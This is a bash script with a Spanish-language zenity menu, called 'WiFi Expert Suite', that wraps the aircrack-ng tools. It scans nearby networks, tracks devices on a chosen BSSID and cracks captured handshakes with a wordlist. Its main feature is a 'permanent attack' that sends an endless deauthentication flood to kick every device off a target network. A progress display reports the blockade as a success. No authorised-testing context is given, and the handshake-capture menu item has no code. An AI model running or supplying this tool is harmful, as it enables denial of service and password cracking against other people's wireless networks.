#!/bin/bash
# WiFi Expert Suite v6.8 - GHOST EDITION

while true; do
    CHOICE=$(zenity --list --title="📡 WiFi Expert Suite PRO" \
        --column="ID" --column="Acción" --column="Descripción" \
        --width=600 --height=500 \
        1 "⚡ Activar Modo Monitor" "Prepara la tarjeta" \
        2 "🌐 Desactivar Modo Monitor" "Restaura el Internet" \
        3 "📡 Escaneo General" "Ver todas las redes" \
        4 "🔍 Rastreo Específico" "Ver dispositivos de una MAC" \
        5 "🔑 Capturar Handshake" "Obtener clave cifrada" \
        6 "🔥 ATAQUE PERMANENTE" "Bloqueo TOTAL con Notificaciones" \
        7 "🔓 DESCIFRAR CLAVE" "Cracking de Handshake" \
        8 "❌ Salir" "Cerrar")

    case $CHOICE in
        1) 
            INT=$(zenity --entry --text="Interfaz (ej: wlan0):" --entry-text="wlan0")
            pkexec airmon-ng start $INT | zenity --text-info --width=400 --height=200
            ;;
        2)
            pkexec airmon-ng stop wlan0mon && pkexec systemctl restart NetworkManager
            notify-send "WiFi Suite" "Internet Restaurado" --icon=network-transmit
            ;;
        3)
            gnome-terminal --title="ESCANEO" -- sh -c "sudo airodump-ng wlan0mon; exec bash"
            ;;
        4)
            BSSID=$(zenity --entry --text="BSSID:")
            CANAL=$(zenity --entry --text="Canal:")
            sudo iwconfig wlan0mon channel $CANAL
            gnome-terminal --title="RASTREO" -- sh -c "sudo airodump-ng --bssid $BSSID -c $CANAL wlan0mon; exec bash"
            ;;
        6)
            BSSID=$(zenity --entry --text="BSSID a Bloquear:")
            CANAL=$(zenity --entry --text="Canal:")
            
            sudo iwconfig wlan0mon channel $CANAL
            
            # Lanzamos el ataque
            sudo aireplay-ng -0 0 -a $BSSID wlan0mon > /dev/null 2>&1 &
            ATAQUE_PID=$!
            
            if ps -p $ATAQUE_PID > /dev/null; then
                # NOTIFICACIÓN Y SONIDO
                notify-send "ATAQUE INICIADO" "Bloqueando BSSID: $BSSID" --icon=dialog-warning
                echo -e "\a" # Pitido de sistema
                
                (
                echo "# 🚀 Sincronizando con Canal $CANAL..." ; sleep 1
                echo "20" ; echo "# 📡 Inyectando paquetes de desautenticación..." ; sleep 1
                echo "50" ; echo "# ⚡ Red saturada exitosamente..." ; sleep 1
                echo "80" ; echo "# 🔥 BLOQUEO ACTIVO: Todos los dispositivos fuera." ; sleep 1
                while ps -p $ATAQUE_PID > /dev/null; do
                    echo "100" ; echo "# [ ATACANDO ] $BSSID - Cierra para detener"
                    sleep 2
                done
                ) | zenity --progress --title="🔥 ESTADO DEL ATAQUE" --percentage=0 --auto-close

                sudo kill $ATAQUE_PID 2>/dev/null
                notify-send "ATAQUE FINALIZADO" "La red ha sido liberada" --icon=info
                echo -e "\a"
            else
                zenity --error --text="Error al iniciar el ataque."
            fi
            ;;
        7)
            CAP_FILE=$(zenity --file-selection --title="Selecciona .cap")
            WORDLIST=$(zenity --file-selection --title="Selecciona wordlist.txt")
            gnome-terminal --title="CRACKING" -- sh -c "aircrack-ng -w $WORDLIST $CAP_FILE; read"
            ;;
        8) exit ;;
    esac
done
